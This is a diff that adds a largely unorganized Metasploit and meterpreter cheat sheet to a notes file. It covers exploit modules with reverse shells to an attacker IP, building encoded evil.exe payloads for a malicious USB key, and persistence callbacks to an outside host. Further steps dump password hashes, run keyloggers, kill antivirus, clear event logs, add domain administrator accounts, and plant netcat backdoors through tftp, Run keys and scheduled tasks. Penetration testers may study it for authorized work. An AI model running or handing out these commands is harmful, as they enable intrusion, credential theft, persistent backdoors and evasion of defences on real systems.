@@ -36,3 +36,407 @@ msf > set payload windows/metsvc_bind_tcp
 msf > set LPORT <port>
 msf > set RHOST <targetIP>
 msf > exploit
+==========================
+
+Below here is NOT yet organized.
+
+meterpreter > impersonate_token DOMAIN\\Administrator
+[+] Delegation token available
+[+] Successfully impersonated user DOMAIN\Administrator 
+
+meterpreter > getuid
+Server username: DOMAIN\Administrator 
+
+meterpreter > shell
+
+C:\WINDOWS\system32> whoami
+whoami
+DOMAIN\administrator
+
+C:\WINDOWS\system32> net user hacker hacker_password /add /domain
+The command completed successfully.
+
+C:\WINDOWS\system32> net group "Domain Admins" hacker /add /domain
+The command completed successfully.
+
+Example Exploits
+Apache Tomcat Manager Common Administrative Credentials
+use multi/tomcat_mgr_deploy
+show options
+set password admin
+set username admin
+set RHOST <target IP>
+set RPORT <target port>
+set PAYLOAD windows/meterpreter/reverse_tcp
+set LHOST <attack IP>
+exploit
+
+MS08-067
+use windows/smb/ms08_067_netapi
+set RHOST <target IP>
+set PAYLOAD windows/meterpreter/reverse_tcp
+set LHOST <attack IP>
+exploit
+
+psexec
+use windows/smb/psexec
+set RHOST <target IP>
+set SMBPass <Administrator hash from another target>
+set PAYLOAD windows/meterpreter/reverse_tcp
+set LHOST <attack IP>
+exploit
+
+Post Exploitation using meterpreter
+run migrate                                       Create a new process and migrate to it.
+ps                                                Show running processes.
+sysinfo                                           Show host name and OS.
+getuid                                            Show current privileges.
+	if not NT AUTHORITY\SYSTEM
+	use priv                                  Escalate privileges.
+	getsystem
+	getuid                                    Privileges should now be NT AUTHORITY\SYSTEM
+screenshot                                        Take a photo of the desktop. 
+hashdump                                          Dump the password hashed.
+ipconfig                                          Look for dual-homed connections
+	if dual-homed
+	run autoroute -s <new CIDR range, 192.168.1.0/24>
+	run autoroute -p                          Print routing table.
+route
+
+use incognito
+list_tokens -g
+list_tokens -u
+add_user accuvant password -h <target IP>
+add_group_user "Enterprise Admins" accuvant -h <target IP>
+add_group_user "Remote Access Users" accuvant -h <target IP>
+
+(Open a new tab in Konsole)
+	cp /pentest/windows-binaries/passwd-attack/fgdump.exe /tmp/
+	cp /pentest/windows-binaries/passwd-attack/cachedump.exe /tmp/
+(Go back to the Metasploit tab)
+	upload /tmp/fgdump.exe c:\\	
+Note: If the AV recognizes the file, your meterpreter session will end.
+Re-exploit the box and upload cachedump.exe.
+If upload is successful
+	shell                                     Drop into a Windows shell.
+	cd \                                      Change to root directory.
+
+idletime                                    
+    	if time < 5 min
+       keyscan_start                              Start the keylogger.
+       keyscan_stop                               Stop the keylogger.
+       keyscan_dump                               Dump keystrokes.
+
+run vnc
+    	if the screen is locked exit VNC                               
+        meterpreter > run screen_unlock                    
+meterpreter > run get_application_list
+meterpreter > run winenum
+
+shell                                             Drop into a Windows shell.
+(from a Windows shell)
+net user                                          Show user accounts.
+net accounts                                      Show password policies.
+net user accuvant accuvant /add                   Add a new account called ciphent with the password ciphent.
+net localgroup Administrators accuvant /add       Add the new account to the Administrators security group.
+net localgroup administrators
+ipconfig
+[take screen shot]
+exit
+
+meterpreter > clearev
+meterpreter > exit
+
+=====
+
+Malicious USB Key
+
+msfpayload windows/meterpreter/reverse_tcp LHOST=attackerIP LPORT=443 R | msfencode -t exe -e x86/shikata_ga_nai > evil.exe
+msfvenom -p windows/meterpreter/reverse_https -f exe LHOST=attackerIP LPORT=443 > evil.exe
+msfpayload windows/meterpreter/reverse_tcp LHOST=attackerIP LPORT=443 R | msfencode -b "/x00" -t exe -e x86/shikata_ga_nai -c 6 -o /root/evil.exe 
+
+use exploit/multi/handler
+set PAYLOAD windows/meterpreter/reverse_https
+set LHOST 0.0.0.0
+set LPORT 443
+set ExitOnSession false
+exploit -j
+
+=====
+
+getpid
+ps
+migrate XX
+sysinfo
+getuid
+getprivs
+idletime
+getwd
+ls
+
+shell
+dir
+exit
+
+clearev
+
+upload <local path> <remote path>
+upload /root/putty.exe C:\\Documents\ and\ Settings\\Administrator\Desktop\
+
+hashdump
+<copy hashes>
+nano tmp
+<paste hashes>
+cat tmp | cut -d ":" -f4 > ntlm-hashes
+cat ntlm-hashes
+
+run checkvm
+run getcountermeasure
+run get_local_subnets
+run killav
+run getgui -e
+<open a new tab>
+rdesktop <target IP>
+
+run gettelnet -u root -p toor
+<open a new tab>
+telnet <target IP>
+root
+toor
+dir
+
+run persistence -r <attacker IP> -p 443 -A -x -i 100
+background
+sessions
+(notice the new session opened)
+sessions -i <new session Id>
+ls
+getuid
+run winenum
+(open a new tab)
+cd .msf3/logs/winenum
+ls
+cd <target name>
+ls
+
+use sniffer
+help
+sniffer_interfaces
+sniffer_start 1
+(let run for a while)
+sniffer_stats 1
+sniffer_dump 1 /root/tmp.cap
+sniffer_stop 1
+(open the cap file with Wireshark)
+
+run scheduleme -m 1 -u -e /root/test.exe
+
+=====
+
+use exploit/multi/handler
+set PAYLOAD windows/meterpreter/reverse_tcp
+set LHOST rmccurdy.com
+set LPORT 21
+set ExitOnSession false
+# set AutoRunScript pathto script you want to autorun after exploit is run 
+set AutoRunScript persistence -r 75.139.158.51 -p 21 -A -X -i 30 
+
+exploit -j -z
+
+# file_autopwn
+rm -Rf /tmp/1 
+mkdir /tmp/1 
+rm -Rf ~/.msf3
+
+wget -O /tmp/file3.pdf https://www1.nga.mil/Newsroom/PressReleases/Press%20Releases/nga10_02.pdf
+
+msfconsole
+
+db_driver sqlite3
+db_create pentest11
+setg LHOST 75.139.158.51
+setg LPORT 21
+setg SRVPORT 21
+setg LPORT_WIN32 21
+
+setg INFILENAME /tmp/file3.pdf
+
+use auxiliary/server/file_autopwn
+
+set OUTPATH /tmp/1
+
+set URIPATH /msf
+set SSL true
+set ExitOnSession false
+set PAYLOAD windows/meterpreter/reverse_tcp
+set AutoRunScript persistence -r 75.139.158.51 -p 21 -A -X -i 30
+run
+
+# shows all the scripts
+run [tab]
+
+# persistence! broken ...if you use DNS name ..
+run persistence -r 75.139.158.51 -p 21 -A -X -i 30
+
+run get_pidgin_creds
+
+idletime 
+sysinfo
+
+# SYSTEM SHELL ( pick a proc that is run by system )
+migrate 376
+shell
+
+# session hijack tokens
+use incognito
+impersonate_token "NT AUTHORITY\\SYSTEM"
+
+# escalate to system
+use priv
+getsystem
+
+execute -f cmd.exe -H -c -i -t
+execute -f cmd.exe -i -t
+
+# list top used apps
+run prefetchtool -x 20
+
+# list installed apps
+run prefetchtool -p
+
+run get_local_subnets
+
+# find and download files
+run search_dwld "%USERPROFILE%\\my documents" passwd
+run search_dwld "%USERPROFILE%\\desktop passwd
+run search_dwld "%USERPROFILE%\\my documents" office 
+run search_dwld "%USERPROFILE%\\desktop" office
+
+# alternate 
+download -r "%USERPROFILE%\\desktop"  ~/
+download -r "%USERPROFILE%\\my documents"  ~/
+
+# alternate to shell not SYSTEM
+# execute -f cmd.exe -H -c -i -t
+
+# does some run wmic commands etc
+run winenum
+
+# rev shell the hard way
+run scheduleme -m 1 -u /tmp/nc.exe -o "-e cmd.exe -L -p 8080"
+
+# An example of a run of the file to download via tftp of Netcat and then running it as a backdoor.
+run schtasksabuse-dev -t 192.168.1.7 -c "tftp -i 192.168.1.8 GET nc.exe,nc -L -p 8080 -e cmd.exe" -d 4
+run schtasksabuse -t 192.168.1.7 -c "tftp -i 192.168.1.8 GET nc.exe,nc -L -p 8080 -e cmd.exe" -d 4
+
+# vnc / port fwd for linux
+run vnc
+
+# priv esc 
+run kitrap0d
+
+run getgui
+run killav
+run winemun
+run memdump
+run screen_unlock
+
+upload /tmp/system32.exe C:\\windows\\system32\\ 
+reg enumkey -k HKLM\\software\\microsoft\\windows\\currentversion\\run 
+reg setval -k HKLM\\software\\microsoft\\windows\\currentversion\\run -v system32 -d "C:\\windows\\system32\\system32.exe -Ldp 455 -e cmd.exe" 
+reg queryval -k HKLM\\software\\microsoft\\windows\\currentversion\\Run -v system32 
+reg enumkey -k HKLM\\system\\controlset001\services\\sharedaccess\\parameters\\firewallpolicy\\Standardprofile\\authorizedapplications\\list 
+reg setval -k HKLM\\system\\controlset001\services\\sharedaccess\\parameters\\firewallpolicy\\Standardprofile\\authorizedapplications\\list -v sys
+reg queryval -k HKLM\\system\\controlset001\services\\sharedaccess\\parameters\\firewallpolicy\\Standardprofile\\authorizedapplications\\list -v system32 
+upload /neo/wallpaper1.bmp "C:\\documents and settings\\pentest3\\local settings\\application data\\microsoft\\" 
+
+getuid
+ps
+getpid
+keyscan_start
+keyscan_dump
+migrate 520
+portfwd add -L 104.4.4 -l 6666 -r 192.168.1.1 -p 80"
+portfwd add -L 192.168.1.1 -l -r 10.5.5.5 -p 6666
+
+shell
+run myremotefileserver_mserver -h
+run myremotefileserver_mserver -p 8787
+
+run msf_bind
+run msf_bind -p 1975
+rev2self
+getuid
+
+getuid
+
+enumdesktops
+grabdesktop
+
+run deploymsf -f framework-3.3-dev.exe
+
+run hashdump
+run metsvc
+run scraper
+run checkvm
+run keylogrecorder
+run netenum -fl -hl localhostlist.txt -d google.com
+run netenum -rl -r 10.192.0.50-10.192.0.254
+run netenum -st -d google.com
+run netenum -ps -r 10.192.0.50-254
+
+# Windows Login Brute Force Meterpreter script
+run winbf -h
+
+# Upload a script or executable and run it
+uploadexec
+
+# Using payload as a backdoor from a shell 
+
+REG add HKEY_CURRENT_USER\Software\Microsoft\Windows\Curre ntVersion\Run /v firewall /t REG_SZ /d "c:\windows\system32\metabkdr.exe" /f
+at 19:00 /every:M,T,W,Th,F cmd /c start "%USERPROFILE%\metabkdr.exe"
+SCHTASKS /Create /RU "SYSTEM" /SC MINUTE /MO 45 /TN FIREWALL /TR "%USERPROFILE%\metabkdr.exe"  /ED 11/11/2011
+
+# kill AV this will not unload it from mem it needs reboot or kill from memory still ... Darkspy, Seem, Icesword GUI can kill the tasks
+catchme.exe  -K "c:\Program Files\Kaspersky\avp.exe"
+catchme.exe  -E "c:\Program Files\Kaspersky\avp.exe"
+catchme.exe  -O "c:\Program Files\Kaspersky\avp.exe" dummy
+
+=====
+
+MSF Post Exploitation
+
+sysinfo
+getuid
+getpid
+ps
+idletime
+run checkvm
+ipconfig
+route
+run get_env
+run get_application_list
+run scraper
+=====
+
+root@bt: cd /root/.msf4/logs/scripts/scrapper/<targetIP>/
+root@bt: ls
+root@bt: cat hashes.txt
+=====
+
+getsystem -t 0
+getuid
+rev2self
+getuid
+ps		Look for process ID that NT/Authority is running (example: Explorer)
+migrate <PID of Explorer>
+getpid
+clearev
+getdesktop
+keyscan_start		(Wait several minutes)
+keyscan_dump
+keyscan_stop
+
+getsystem
+	if this fails
+run post/windows/escalate/bypassuac
